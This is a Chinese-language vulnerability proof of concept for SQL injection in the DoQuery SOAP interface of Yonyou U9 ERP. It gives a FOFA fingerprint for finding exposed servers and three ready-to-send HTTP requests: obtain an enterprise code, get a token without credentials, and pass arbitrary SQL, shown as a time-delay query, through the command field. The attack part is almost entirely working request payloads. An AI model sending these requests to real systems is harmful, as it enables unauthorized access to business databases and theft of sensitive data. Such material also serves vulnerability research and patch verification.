# 用友U9系统DoQuery接口存在SQL注入

用友u9 `DoQuery` 接口存在SQL注入，攻击者可通过该漏洞获取敏感信息。

## fofa

```yaml
body="logo-u9.png"
```

## poc

**第一步：获取code**

```yaml
POST /U9C/CS/Office/TransWebService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: 309
SOAPAction: "http://tempuri.org/GetEnterprise"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetEnterprise xmlns="http://tempuri.org/" />
  </soap:Body>
</soap:Envelope>
```

![image-20240730093905712](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407300939798.png)

**第二步：获取token**

```yaml

POST /U9C/CS/Office/TransWebService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: 345
SOAPAction: "http://tempuri.org/GetToken"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetToken xmlns="http://tempuri.org/">
      <endId>000</endId>
    </GetToken>
  </soap:Body>
</soap:Envelope>
```

![image-20240730093936752](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407300939822.png)

**第三步：SQL注入，token处填入上面获取的**

```yaml
POST /U9C/CS/Office/TransWebService.asmx HTTP/1.1
Host: 
Content-Type: text/xml; charset=utf-8
Content-Length: 345
SOAPAction: "http://tempuri.org/DoQuery"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <DoQuery xmlns="http://tempuri.org/">
      <token></token>
	  <command>select 1;waitfor delay '0:0:1' --</command>
    </DoQuery>
  </soap:Body>
</soap:Envelope>
```

![image-20240730094018683](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202407300941078.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/FTbXyr8U5pW8RGtgurFV4A